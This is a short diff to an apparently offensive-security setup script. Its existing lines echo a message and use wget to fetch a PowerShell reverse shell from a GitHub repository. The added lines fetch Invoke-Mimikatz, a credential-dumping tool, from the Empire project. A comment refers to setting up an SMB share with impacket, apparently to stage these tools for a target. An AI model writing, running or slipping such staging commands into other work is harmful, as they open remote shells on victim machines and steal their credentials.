@@ -26,6 +26,9 @@ echo " "
 
 	echo "-[+] Downloading Powershell Reverse Shell"
 	wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/WinPrivEsc/PowershellReverseShell.ps1 -O revshell.ps1
+	
+	echo "-[+] Downloading Mimikatz"
+	wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 -O mkatz.ps1
 
 
 # setting up SMB share using impacket
